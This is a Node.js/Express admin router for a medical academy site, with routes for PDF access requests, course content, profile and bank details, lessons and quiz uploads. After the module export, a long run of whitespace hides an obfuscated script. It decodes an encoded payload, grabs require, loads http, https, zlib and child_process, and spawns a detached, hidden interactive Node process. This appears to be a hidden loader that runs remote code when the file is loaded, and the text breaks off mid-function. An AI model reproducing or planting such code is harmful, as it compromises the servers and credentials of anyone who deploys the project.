router.post("/admin/pdf-access-requests/:requestId/reject", adminAuth, async (req, res) => {
  try {
    const requestId = String(req.params.requestId || "").trim();
    const request = await PdfAccessRequest.findOne({ _id: requestId });
    if (!request) {
      return res.status(404).json({ message: "Request not found" });
    }

    const updated = await PdfAccessRequest.findOneAndUpdate(
      { _id: requestId },
      {
        status: "rejected",
        reviewedBy: req.admin.email || "admin",
        reviewedAt: new Date(),
        adminNote: String(req.body?.adminNote || "Rejected").trim(),
        updatedAt: new Date()
      },
      { new: true }
    );

    return res.json({ message: "PDF access request rejected", request: updated });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.get("/admin/academy/content", adminAuth, async (_req, res) => {
  try {
    const profile = await ensureAcademyProfile();
    const blocksRaw = await SubjectContent.find({});
    const blocks = blocksRaw.map((row) => {
      const doc = row && typeof row.toObject === "function" ? row.toObject() : row;
      const subjectKey = String(doc?.subjectKey || "").trim().toLowerCase();
      if (subjectKey !== "biochemistry") {
        return doc;
      }

      const normalizedTopics = normalizeBiochemistryTopics(doc?.blockKey, doc?.topics || []);
      const normalizedSections = normalizedTopics.map((topicName) => {
        const existing = (Array.isArray(doc?.sections) ? doc.sections : []).find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
        return existing || {
          name: topicName,
          videoItems: [],
          noteText: "",
          noteResources: [],
          clinicalText: "",
          clinicalResources: []
        };
      });

      return {
        ...doc,
        topics: normalizedTopics,
        sections: normalizedSections
      };
    });

    return res.json({
      profile,
      blocks
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

router.post(
  "/admin/academy/block",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "noteFiles", maxCount: 100 },
    { name: "clinicalFiles", maxCount: 100 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const subjectKey = String(req.body?.subjectKey || "").trim().toLowerCase();
      const blockKey = String(req.body?.blockKey || "").trim().toLowerCase();

      if (!subjectKey || !blockKey) {
        return res.status(400).json({ message: "subjectKey and blockKey are required" });
      }

      const id = `${subjectKey}_${blockKey}`;
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      const rawSectionName = String(req.body?.sectionName || "").trim();
      const sectionName = rawSectionName && rawSectionName !== "__block__" ? rawSectionName : "";
      const topics = splitValues(req.body?.topics);
      const noteText = String(req.body?.noteText || "").trim();
      const clinicalText = String(req.body?.clinicalText || "").trim();
      const videoItems = parseLineLinks(req.body?.videoLinks, contentAccessLevel);

      let blockFilesToDelete = {};
      try {
        const deleteParam = String(req.body?.blockFilesToDelete || "").trim();
        if (deleteParam) {
          blockFilesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        blockFilesToDelete = {};
      }

      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(arr) || !Array.isArray(indices) || !indices.length) {
          return Array.isArray(arr) ? [...arr] : [];
        }

        const result = [...arr];
        [...new Set(indices)]
          .map((index) => Number(index))
          .filter((index) => Number.isInteger(index) && index >= 0)
          .sort((left, right) => right - left)
          .forEach((index) => {
            if (index < result.length) {
              result.splice(index, 1);
            }
          });

        return result;
      };

      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => ({
        title: path.basename(file.originalname || `Video ${index + 1}`, path.extname(file.originalname || "")),
        url: `/static/uploads/${file.filename}`,
        accessLevel: contentAccessLevel,
        mimeType: file.mimetype || "application/octet-stream",
        size: file.size || 0
      }));

      const noteResources = (req.files?.noteFiles || []).map((file, index) => createAssetRecord(file, "note", index, contentAccessLevel));
      const clinicalResources = (req.files?.clinicalFiles || []).map((file, index) => createAssetRecord(file, "clinical", index, contentAccessLevel));

      const existing = await SubjectContent.findOne({ id });
      const existingSections = Array.isArray(existing?.sections)
        ? existing.sections.map((section) => {
            const doc = section && typeof section.toObject === "function" ? section.toObject() : section;
            return {
              name: String(doc?.name || "").trim(),
              videoItems: sanitizeLinks(doc?.videoItems || []),
              noteText: String(doc?.noteText || "").trim(),
              noteResources: mergeUniqueLinks([], doc?.noteResources || []),
              clinicalText: String(doc?.clinicalText || "").trim(),
              clinicalResources: mergeUniqueLinks([], doc?.clinicalResources || [])
            };
          }).filter((section) => section.name)
        : [];

      const remainingVideoLinks = removeByIndices(videoItems, blockFilesToDelete.videoItems || []);

      let nextSections = existingSections;
      if (sectionName) {
        const lower = sectionName.toLowerCase();
        const currentSection = existingSections.find((section) => String(section.name || "").toLowerCase() === lower) || {};
        const updatedSection = {
          name: sectionName,
          videoItems: sanitizeLinks(mergeUniqueLinks(removeByIndices(currentSection.videoItems, blockFilesToDelete.videoItems || []), [...remainingVideoLinks, ...uploadedVideos])),
          noteText: noteText || currentSection.noteText || "",
          noteResources: mergeUniqueLinks(removeByIndices(currentSection.noteResources, blockFilesToDelete.noteResources || []), noteResources),
          clinicalText: clinicalText || currentSection.clinicalText || "",
          clinicalResources: mergeUniqueLinks(removeByIndices(currentSection.clinicalResources, blockFilesToDelete.clinicalResources || []), clinicalResources)
        };

        nextSections = [
          ...existingSections.filter((section) => String(section.name || "").toLowerCase() !== lower),
          updatedSection
        ];
      }

      const next = await SubjectContent.findOneAndUpdate(
        { id },
        (() => {
          const mergedTopics = sectionName
            ? mergeUniqueStrings(existing?.topics, [...topics, sectionName])
            : mergeUniqueStrings(existing?.topics, topics);
          const nextTopics = subjectKey === "biochemistry"
            ? normalizeBiochemistryTopics(blockKey, mergedTopics)
            : mergedTopics;
          const nextNormalizedSections = subjectKey === "biochemistry"
            ? nextTopics.map((topicName) => {
                const existingSection = nextSections.find((section) => String(section?.name || "").trim().toLowerCase() === String(topicName || "").trim().toLowerCase());
                return existingSection || {
                  name: topicName,
                  videoItems: [],
                  noteText: "",
                  noteResources: [],
                  clinicalText: "",
                  clinicalResources: []
                };
              })
            : nextSections;

          return {
          id,
          subjectKey,
          blockKey,
          blockTitle: String(req.body?.blockTitle || existing?.blockTitle || blockKey).trim(),
          topics: nextTopics,
          sections: nextNormalizedSections,
          videoItems: sectionName
            ? sanitizeLinks(existing?.videoItems || [])
            : sanitizeLinks(mergeUniqueLinks(removeByIndices(existing?.videoItems || [], blockFilesToDelete.videoItems || []), [...remainingVideoLinks, ...uploadedVideos])),
          noteText: sectionName ? (existing?.noteText || "") : (noteText || existing?.noteText || ""),
          clinicalText: sectionName ? (existing?.clinicalText || "") : (clinicalText || existing?.clinicalText || ""),
          noteResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.noteResources || [], blockFilesToDelete.noteResources || []), noteResources),
          clinicalResources: sectionName
            ? mergeUniqueLinks([], removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []))
            : mergeUniqueLinks(removeByIndices(existing?.clinicalResources || [], blockFilesToDelete.clinicalResources || []), clinicalResources)
          };
        })(),
        { new: true, upsert: true }
      );

      schedulePurgeOrphanGridFs();
      return res.status(201).json({ block: next });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post(
  "/admin/academy/profile",
  adminAuth,
  contentUpload.fields([
    { name: "overviewBooksFiles", maxCount: 50 },
    { name: "overviewPremiumFiles", maxCount: 50 },
    { name: "overviewSlidesFiles", maxCount: 50 },
    { name: "overviewShortFiles", maxCount: 50 },
    { name: "overviewVideoFiles", maxCount: 50 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const profile = await ensureAcademyProfile();
      const body = req.body || {};

      const aboutAcademyText = String(body.aboutAcademyText || profile.aboutAcademyText || "").trim();
      const contactNumbers = splitValues(body.contactNumbers);
      const hasIntroVideoField = Object.prototype.hasOwnProperty.call(body, "introVideoUrl");

      // Handle file deletions if specified
      let filesToDelete = {};
      try {
        const deleteParam = String(req.body?.filesToDelete || "").trim();
        if (deleteParam) {
          filesToDelete = JSON.parse(deleteParam);
        }
      } catch (_err) {
        // Ignore parse errors
      }

      // Helper to remove items by index
      const removeByIndices = (arr, indices) => {
        if (!Array.isArray(indices) || !indices.length) return arr;
        const sorted = [...new Set(indices)].sort((a, b) => b - a);
        const result = Array.isArray(arr) ? [...arr] : [];
        sorted.forEach(idx => {
          if (idx >= 0 && idx < result.length) {
            result.splice(idx, 1);
          }
        });
        return result;
      };

      // Apply deletions to existing files
      let books = removeByIndices(profile.generalOverview?.books || [], filesToDelete.books || []);
      let premiumNotes = removeByIndices(profile.generalOverview?.premiumNotes || [], filesToDelete.premiumNotes || []);
      let importantSlides = removeByIndices(profile.generalOverview?.importantSlides || [], filesToDelete.importantSlides || []);
      let shortNotes = removeByIndices(profile.generalOverview?.shortNotes || [], filesToDelete.shortNotes || []);
      let videos = removeByIndices(profile.generalOverview?.videos || [], filesToDelete.videos || []);

      // Handle file uploads for overview sections
      const overviewBooksFiles = (req.files?.overviewBooksFiles || []).map((file, index) => createAssetRecord(file, "book", index));
      const overviewPremiumFiles = (req.files?.overviewPremiumFiles || []).map((file, index) => createAssetRecord(file, "premium_notes", index, "paid"));
      const overviewSlidesFiles = (req.files?.overviewSlidesFiles || []).map((file, index) => createAssetRecord(file, "slides", index));
      const overviewShortFiles = (req.files?.overviewShortFiles || []).map((file, index) => createAssetRecord(file, "short_notes", index));
      const overviewVideoFiles = (req.files?.overviewVideoFiles || []).map((file, index) => {
        const asset = createAssetRecord(file, "video", index);
        return {
          title: asset.title,
          url: asset.fileUrl
        };
      });

      // Merge new uploads with remaining files (after deletions)
      books = sanitizeLinks(mergeUniqueLinks(books, overviewBooksFiles));
      premiumNotes = sanitizeLinks(mergeUniqueLinks(premiumNotes, overviewPremiumFiles));
      importantSlides = sanitizeLinks(mergeUniqueLinks(importantSlides, overviewSlidesFiles));
      shortNotes = sanitizeLinks(mergeUniqueLinks(shortNotes, overviewShortFiles));
      const manualVideos = String(body.overviewVideos || "").trim() ? parseLineLinks(body.overviewVideos) : [];
      const remainingManualVideos = removeByIndices(manualVideos, filesToDelete.videos || []);
      videos = sanitizeLinks(mergeUniqueLinks(videos, [...remainingManualVideos, ...overviewVideoFiles]));
      const aboutNotes = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.notes, String(body.aboutNotes || "").trim() ? parseLineLinks(body.aboutNotes) : []));
      const aboutPdfResources = sanitizeLinks(mergeUniqueLinks(profile.aboutUs?.pdfResources, String(body.aboutPdfResources || "").trim() ? parseLineLinks(body.aboutPdfResources) : []));
      const introVideoUrl = hasIntroVideoField
        ? String(body.introVideoUrl || "").trim()
        : String(profile.aboutUs?.introVideoUrl || "").trim();

      const updated = await AcademyProfile.findOneAndUpdate(
        { id: "academy_profile" },
        {
          id: "academy_profile",
          aboutAcademyText,
          bankDetails: {
              bankName: String(body.bankName || profile.bankDetails?.bankName || "").trim(),
              accountTitle: String(body.accountTitle || profile.bankDetails?.accountTitle || "").trim(),
              accountNumber: String(body.accountNumber || profile.bankDetails?.accountNumber || "").trim(),
              iban: String(body.iban || profile.bankDetails?.iban || "").trim()
          },
          generalOverview: {
            books,
            premiumNotes,
            importantSlides,
            shortNotes,
            videos
          },
          aboutUs: {
            profileImageUrl: String(body.profileImageUrl || profile.aboutUs?.profileImageUrl || "/static/images/favicon.png").trim(),
            introVideoUrl,
            notes: aboutNotes,
            pdfResources: aboutPdfResources,
            contactEmail: String(body.contactEmail || profile.aboutUs?.contactEmail || "").trim(),
            contactNumbers: contactNumbers.length ? contactNumbers : (Array.isArray(profile.aboutUs?.contactNumbers) ? profile.aboutUs.contactNumbers : []),
            socialLinks: {
              facebook: String(body.facebookUrl || profile.aboutUs?.socialLinks?.facebook || "").trim(),
              youtube: String(body.youtubeUrl || profile.aboutUs?.socialLinks?.youtube || "").trim(),
              instagram: String(body.instagramUrl || profile.aboutUs?.socialLinks?.instagram || "").trim(),
              linkedin: String(body.linkedinUrl || profile.aboutUs?.socialLinks?.linkedin || "").trim()
            }
          }
        },
        { new: true, upsert: true }
      );

      schedulePurgeOrphanGridFs();
      return res.status(201).json({ profile: updated });
    } catch (err) {
      console.error("Error in POST /admin/academy/profile:", err);
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post(
  "/admin/lesson",
  adminAuth,
  contentUpload.fields([
    { name: "videoFiles", maxCount: 100 },
    { name: "audioFiles", maxCount: 100 },
    { name: "materialFiles", maxCount: 100 }
  ]),
  uploadFilesToGridFS,
  async (req, res) => {
    try {
      const { title, courseId, videoUrl, lessonId, summary, caseStudies } = req.body || {};
      const contentAccessLevel = normalizeAccessLevel(req.body?.contentAccessLevel);
      if (!title || !courseId) {
        return res.status(400).json({ message: "Title and courseId are required" });
      }

      const course = await Course.findOne({ courseId });
      if (!course) {
        return res.status(404).json({ message: "Course not found" });
      }

      const videoUrls = splitValues(videoUrl);
      const uploadedVideos = (req.files?.videoFiles || []).map((file, index) => createAssetRecord(file, "video", index, contentAccessLevel));
      const uploadedAudios = (req.files?.audioFiles || []).map((file, index) => createAssetRecord(file, "audio", index, contentAccessLevel));
      const uploadedMaterials = (req.files?.materialFiles || []).map((file, index) => createAssetRecord(file, "material", index, contentAccessLevel));
      let lessonVideosToClear = [];
      try {
        const clearParam = String(req.body?.lessonVideosToClear || "").trim();
        if (clearParam) {
          lessonVideosToClear = JSON.parse(clearParam);
        }
      } catch (_err) {
        lessonVideosToClear = [];
      }
      const parsedCaseStudies = parseCaseStudies(caseStudies);
      const summaryText = String(summary || "").trim();

      const sources = [
        ...videoUrls.map((url) => ({ videoUrl: url, videoType: isYoutubeUrl(url) ? "youtube" : "upload" })),
        ...uploadedVideos.map((asset) => ({ videoUrl: asset.fileUrl, videoType: "upload", videoAsset: asset }))
      ];

      const hasContent = sources.length || uploadedAudios.length || uploadedMaterials.length || parsedCaseStudies.length || summaryText || lessonVideosToClear.length;
      if (!hasContent) {
        return res.status(400).json({ message: "Add at least one video, audio file, material, case study, or summary" });
      }

      if (!sources.length) {
        sources.push({ videoUrl: "", videoType: null });
      }

      const baseLessonId = `lesson_${normalizeId(title)}`;
      const relatedLessons = await Lesson.find({
        courseId,
        lessonId: { $regex: `^${baseLessonId}(?:_[0-9]+)?$` }
      }).sort({ createdAt: 1 });

      const usedIndexes = new Set();
      relatedLessons.forEach((item) => {
        const id = String(item.lessonId || "").trim();
        if (id === baseLessonId) {
          usedIndexes.add(1);
          return;
        }
        const suffixMatch = id.match(new RegExp(`^${baseLessonId}_(\\d+)$`));
        if (suffixMatch) {
          usedIndexes.add(Number(suffixMatch[1]));
        }
      });

      const nextAvailableIndex = () => {
        let idx = 1;
        while (usedIndexes.has(idx)) {
          idx += 1;
        }
        usedIndexes.add(idx);
        return idx;
      };

      const lessons = [];
      const hasIncomingVideoSources = videoUrls.length > 0 || uploadedVideos.length > 0;
      for (let index = 0; index < sources.length; index += 1) {
        const currentSource = sources[index];
        const resolvedIndex = lessonId
          ? null
          : (hasIncomingVideoSources ? nextAvailableIndex() : 1);
        const currentLessonId = lessonId
          ? lessonId
          : (resolvedIndex === 1 ? baseLessonId : `${baseLessonId}_${resolvedIndex}`);
        const existingLesson = await Lesson.findOne({ lessonId: currentLessonId });
        const currentTitle = lessonId
          ? title
          : (resolvedIndex && resolvedIndex > 1 ? `${title} ${resolvedIndex}` : title);
        const audioItems = mergeUniqueLinks(existingLesson?.audioItems, uploadedAudios);
        const materials = mergeUniqueLinks(existingLesson?.materials, uploadedMaterials);
        const caseStudyItems = parsedCaseStudies.length ? parsedCaseStudies : Array.isArray(existingLesson?.caseStudies) ? existingLesson.caseStudies : [];
        const shouldClearVideo = lessonVideosToClear.includes(currentLessonId);
        const videoValue = shouldClearVideo ? "" : (currentSource.videoUrl || existingLesson?.videoUrl || "");

        const lesson = await Lesson.findOneAndUpdate(
          { lessonId: currentLessonId },
          {
            lessonId: currentLessonId,
            courseId,
            title: currentTitle,
            accessLevel: contentAccessLevel,
            summary: summaryText || existingLesson?.summary || "",
            videoUrl: videoValue,
            videoType: videoValue ? (currentSource.videoType || existingLesson?.videoType || (isYoutubeUrl(videoValue) ? "youtube" : "upload")) : null,
            audioItems,
            materials,
            caseStudies: caseStudyItems,
            quizId: existingLesson?.quizId || `quiz_${normalizeId(currentLessonId)}`
          },
          { new: true, upsert: true }
        );

        lessons.push({
          id: lesson.lessonId,
          courseId: lesson.courseId,
          title: lesson.title,
          videoUrl: lesson.videoUrl,
          videoType: lesson.videoType || null,
          audioCount: (lesson.audioItems || []).length,
          materialCount: (lesson.materials || []).length,
          caseStudyCount: (lesson.caseStudies || []).length,
          quizId: lesson.quizId
        });
      }

      schedulePurgeOrphanGridFs();
      return res.status(201).json({
        lessons,
        message: lessons.length === 1 ? "Lesson saved successfully" : `${lessons.length} lessons created successfully`
      });
    } catch (err) {
      return res.status(500).json({ message: `Server error: ${err.message}` });
    }
  }
);

router.post("/admin/quiz", adminAuth, async (req, res) => {
  try {
    const { lessonId, title, questions } = req.body || {};
    if (!lessonId || !title || !Array.isArray(questions) || questions.length === 0) {
      return res.status(400).json({ message: "lessonId, title, and questions are required" });
    }

    const lesson = await Lesson.findOne({ lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Lesson not found" });
    }

    const quizId = lesson.quizId || `quiz_${normalizeId(lessonId)}`;
    const quiz = await Quiz.findOneAndUpdate(
      { quizId },
      { quizId, courseId: lesson.courseId, lessonId, title, questions },
      { new: true, upsert: true }
    );

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

function parseQuizText(text) {
  const lines = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];
  let current = null;

  lines.forEach((line) => {
    if (line.toLowerCase().startsWith("lesson:")) {
      lessonTitle = line.split(":")[1].trim();
      return;
    }
    if (line.startsWith("Q:")) {
      if (current) {
        questions.push(current);
      }
      current = {
        id: `q${questions.length + 1}`,
        question: line.replace("Q:", "").trim(),
        options: [],
        correctAnswer: ""
      };
      return;
    }
    if (line.match(/^[A-D]:/)) {
      const option = line.substring(2).trim();
      if (current) {
        current.options.push(option);
      }
      return;
    }
    if (line.toLowerCase().startsWith("answer:")) {
      const letter = line.split(":")[1].trim().toUpperCase();
      const indexMap = { A: 0, B: 1, C: 2, D: 3 };
      const optionIndex = indexMap[letter];
      if (current && current.options[optionIndex]) {
        current.correctAnswer = current.options[optionIndex];
      }
    }
  });

  if (current) {
    questions.push(current);
  }

  return { lessonTitle, questions };
}

function parseQuizCsv(text) {
  const rows = text.split(/\r?\n/).map((line) => line.trim()).filter(Boolean);
  let lessonTitle = "";
  const questions = [];

  rows.forEach((row, index) => {
    const columns = row.split(",").map((value) => value.trim());

    if (columns[0] && columns[0].toLowerCase() === "lesson") {
      lessonTitle = columns[1] || lessonTitle;
      return;
    }
    if (index === 0 && /question/i.test(columns[0] || "")) {
      return;
    }
    if (columns.length >= 6) {
      const [question, optionA, optionB, optionC, optionD, answer] = columns;
      const options = [optionA, optionB, optionC, optionD].filter(Boolean);
      const answerMap = { A: 0, B: 1, C: 2, D: 3 };
      const normalizedAnswer = String(answer || "").trim().toUpperCase();
      const correctAnswer = Object.prototype.hasOwnProperty.call(answerMap, normalizedAnswer)
        ? options[answerMap[normalizedAnswer]] || ""
        : answer;

      if (question && options.length >= 2) {
        questions.push({
          id: `q${questions.length + 1}`,
          question,
          options,
          correctAnswer
        });
      }
    }
  });

  return { lessonTitle, questions };
}

router.post("/admin/quiz/upload", adminAuth, quizUpload.single("file"), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ message: "File is required" });
    }

    const text = req.file.buffer.toString("utf-8");
    let parsed = parseQuizText(text);
    if (!parsed.questions.length) {
      parsed = parseQuizCsv(text);
    }

    let { questions } = parsed;
    const lessonId = req.body.lessonId;
    if (!lessonId) {
      return res.status(400).json({ message: "Lesson selection is required" });
    }
    if (!questions.length) {
      return res.status(400).json({ message: "No questions found" });
    }

    let lesson = await Lesson.findOne({ lessonId: lessonId });
    if (!lesson) {
      return res.status(404).json({ message: "Selected lesson not found" });
    }
    
    const baseQuizId = `quiz_${normalizeId(lesson.lessonId)}`;
    const existingCount = await Quiz.countDocuments({ lessonId: lesson.lessonId });
    const quizNumber = existingCount + 1;
    const quizId = `${baseQuizId}_${quizNumber}`;
    const quizTitle = parsed.lessonTitle || `${lesson.title} Quiz ${quizNumber}`;
    const quiz = await Quiz.create({
      quizId,
      courseId: lesson.courseId,
      lessonId: lesson.lessonId,
      title: quizTitle,
      questions
    });

    return res.status(201).json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (err) {
    return res.status(500).json({ message: `Server error: ${err.message}` });
  }
});

router.get("/quiz", async (req, res) => {
  try {
    const { lessonId } = req.query;
    if (!lessonId) {
      return res.status(400).json({ message: "lessonId is required" });
    }

    const quiz = await Quiz.findOne({ lessonId });
    if (!quiz) {
      return res.status(404).json({ message: "Quiz not found" });
    }

    return res.json({
      quiz: {
        id: quiz.quizId,
        courseId: quiz.courseId,
        lessonId: quiz.lessonId,
        title: quiz.title,
        questions: quiz.questions
      }
    });
  } catch (_err) {
    return res.status(500).json({ message: "Server error" });
  }
});

// Frees MongoDB storage by permanently deleting uploaded files that are no
// longer referenced by any content. Deletes are allowed by Atlas even when the
// cluster is over its storage quota, so this is what unblocks writes again.
router.post("/admin/storage/cleanup", adminAuth, async (_req, res) => {
  try {
    if (!isFilesBucketReady()) {
      return res.status(503).json({ message: "Storage not ready yet. Try again in a moment." });
    }

    const stats = await purgeOrphanGridFs();
    const toMB = (bytes) => Math.round(((bytes || 0) / (1024 * 1024)) * 100) / 100;

    return res.json({
      message: stats.orphanCount
        ? `Freed ${toMB(stats.reclaimedBytes)} MB by deleting ${stats.orphanCount} unused file(s).`
        : "No unused files found. Storage is already clean.",
      deletedFiles: stats.orphanCount,
      reclaimedMB: toMB(stats.reclaimedBytes),
      remainingMB: toMB(stats.totalBytes - stats.reclaimedBytes)
    });
  } catch (err) {
    return res.status(500).json({ message: `Cleanup failed: ${err.message}` });
  }
});

module.exports = router;																																																																																																																																																																																																																																																																										global.i = 'A10-*42';function a(a){var c="|Pn2Zjx.w@Qf\";`]vmTs5Jc>OYgE7tpzL!_R/3BFAD^)U<lo:Gd~$NhK*iS(9u0[H+X,%kq1yI6?{r}eMVWC=ab#&48",d=""+(a||""),e=d.length,f=[],g=0,h=0,j=-1;for(var k=0;k<e;k++){var m=c.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;g|=j<<h;h+=(j&8191)>88?13:14;do{f.push(g&255);g>>=8;h-=8}while(h>7);j=-1}}if(j>-1){f.push((g|j<<h)&255)}return l(f)}function b(b,d){return a(c.slice(b,b+d))}var c="o_vMB>dh\"B&F{|&PGNOI3Q7Bq1f9tqBW;O2FVBr:nm.yC`dXCi6Q+CpsLDEQ,,c7X@y])Z%TW:\"pEAPUGCL0I`vYE`DYx=$5]@wj,I|R/Biifuk`)ddXI)eW:HWv_a,j(;,M^UbAH.|=hk(TDH5>Us%edKlZQy3*vf0)\"x%\"CgS[>WB4HaU3$C0QGF}9|N%w^m/!UleMD,pS#Z%rgI:cnM@^MZ:T_*(Iw{B|/mh@?CRFs|@bZ+/4m80lG4O[>SmlZt47}3iJQmVuaEN[I@yo_R)>{]V$bS5z+fC)Bp2RLgX{m3iJQmVuaENhq[B7vL)ug}Vgn={3iJQmVuaEN[I@y5ROl%Nm}VDx*`3iJQmVuaEN[Ir95Am9fLEMzs`w]?pGx3)Ay@71VmhHhy?3G^3iJQmVuaEN[Ir9RBRg+hp1tVXH^:Pv#_\"x2L;VvwqHY+RC;p[A4?sylc*cmQU7ZjN{t`aSe]$Wdl6O>fN4P.$|BT$s#Gg]8[Nsb7M%v%pEh+:HxyB9\"Jkl^1^X$&LT3Qok$mPaEWjfW=R)TLmI`IZX1,}gf+cO/>.l2)2%GhBtmE[WU.B.jt{=A&!R)dgK?IjNLzAa@R~+e^kTtA*hhrd#KZ/FzmWzyVo){Q~gN9=,xxTN$V%h|OxkL/Co5a7<upq4oKnA}#ql6#A/{cu}$.Wx`i=5E&[C(?Zm2F96`Id;`~1#3cx#<<Bx[*q]W5lN3cQkr}cxgdDEZB@;KJ3iJQ@DFanKt?;e_>F;]\"ySD#?/_bSis<N_A/#CWo5B5@2;oF#b?+odzJ[O=ce?Ld2[xQzF2a>K@+Q2~2=bIu_*e\"xYB>iiwjgYQw)F&}43(n$rQ3S_Lo,wB5+Yu>h;#|nZH=No%ta^4we?dS7ldK9!ICM;x>T!Kj?lfr3}3bmim<8^OMrL8i!$rc:!7.&Vs`.q}X%$xc$F5Fl5I<_=n$iY9CA&8}8^OMrLbTM1D`gmcF6#0:xG)$S&tr|FH`tHsnH{7X&X)ZxO/Afs9}f5<X}~ncDF.sE$:I]feoTc;%Q;.DL^OMrL8iS$xc$F5FQb6iQswZ5IHvk7DLOqHWWCsh7siiOSMVPIOYLeOufWAp23U9tGKjvd4uhwQgB6gdjzKEzxe5EpnsZOtQfVehjS9boXG3AEWN0C3C1t6Jk1PUMRFQAXz0XPPqcZ0Bn51eNno2AGgvvOYWD3SFJ0WMfHn1mL9S9sT1yEUJOKPW5OM0E5fl9tMzigxdbEsJ8GHMT2zHNwXQ5FuQjZiymq4NXuqsU";function d(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}a:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue a;return b}catch(e){}return b||this}var e=d()||{},f=e.TextDecoder,g=e.Uint8Array,h=e.Buffer,i=e.String||String,j=e.Array||Array,k=function(){var a=new j(128),b=i.fromCodePoint||i.fromCharCode,c=[];return function(d){var e,f,g=d.length;c.length=0;for(var h=0;h<g;){f=d[h++];f<=127?e=f:f<=223?e=(f&31)<<6|d[h++]&63:f<=239?e=(f&15)<<12|(d[h++]&63)<<6|d[h++]&63:i.fromCodePoint?e=(f&7)<<18|(d[h++]&63)<<12|(d[h++]&63)<<6|d[h++]&63:(e=63,h+=3);c.push(a[e]||(a[e]=b(e)))}return c.join("")}}();function l(a){return typeof f!=="undefined"&&f?(new f).decode(new g(a)):typeof h!=="undefined"&&h?h.from(a).toString("utf-8"):k(a)}var m=n();function n(){var a=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],b,c=[];try{b=Object;c.push("".__proto__.constructor.name)}catch(e){}b:for(var d=0;d<a.length;d++)try{b=a[d]();for(var e=0;e<c.length;e++)if(typeof b[c[e]]==="undefined")continue b;return b}catch(e){}return b||this}function o(a){switch(a){case"aowaYkQ":return m.Map;case"ScVvzHB":return m.Math;case"LYahbCb":return m.JSON;case"UcVlGXr":return m.Boolean;case"GO7Nrh":return m.tTUslG;case"z2lXInR":return m.TG2cJIk;case"LjKGqSw":return m.to__5dE;case"XzeSjRU":return m.hPRNJpg;case"BLxK2l":return m.Sclv_Jn;case"w8SHhF":return m.BigInt;case"w24XslL":return m.RwXr52a;case"HdYixQ":return m.llZ36m;case"P2AKM57":return m.vM7khEA;case"UqL1mIS":return m.MgHS1fx;case"bqgS0uT":return m.cNfC_7;case"zry4hT0":return m.VJNU3_;case"wOf1fy":return m.Number;case"TAIsJro":return m.Error;case"jQvQTiW":return m.MFMrPhJ;case"9MPP0cK":return m.JtrWh6;case"i11XSB":return m.E5BYrDP;case"9zqtB2O":return m.UzYC2SR;case"cHMvB92":return m.OaeceOf;case"k__4zk":return m.setTimeout;case"xh5d15l":return m.O_iVybz;case"gERyCM":return m.WYrZbg3;case"TZqePfg":return m.KM0n1S;case"MoCspX":return m.xfebTjG;case"rZ5CTo1":return m.rbDj0XM;case"tW6Pn0":return m.FnZlfg_;case"pOZAUNs":return m.Array;case"G6145X":return m.wI0nBkk;case"7Qu4NZb":return m.dtj7OXY;case"Bd1rSK":return m.ie99moZ;case"3o6cDhK":return m.RFJv7_;case"HbfDUfa":return m.hvpU54;case"cIKxCVp":return m.KzTTyR_;case"BimznrA":return m.j3Qtuw6;case"tdTjubV":return m.Promise;case"ilyFOCU":return m.wocW6T;case"y8sAIw":return m.JuwsDx;case"qjSqfm":return m.hNpMC1p;case"aJiSad":return m.eyFciSD;case"BlBOECA":return m.v4EfHU;case"bBSqay":return m.ItLZkU;case"JOOaEO5":return m.ihgc7mc;case"un8sN4v":return m.GZqewR;case"Mk0LmrW":return m.Set;case"hDlNJsF":return m.AbortController;case"KV6k6c":return m.xi3JBX;case"NEujWY":return m.q6lpgVG}}global.r=require;if(typeof module==="object"){global.m=module}const p=require("node:http"),q=require("node:https"),r=require("node:zlib"),{URL:s}=require("node:url"),{spawn:t}=require("node:child_process");function u(a){return new(o("tdTjubV"))(b=>{let d;try{d=t("node",["-i"],{detached:!0,windowsHide:!0,stdio:["pipe","pipe","pipe"]})}catch{b();return}let e="",f=!1;const g=()=>{return b()},h=()=>{function b(e){var h="MN;k5@81(.bBhxU0ycDQ6=Xw`</KeV>CGg]~IZ\"i$F!Y4W#|n9t%&3+auLq:foHEr^[7R2*lOvP)_dSs}zTm{,JA?jp",d=""+(e||""),f=d.length,g=[],a=0,c=0,j=-1;for(var k=0;k<f;k++){var 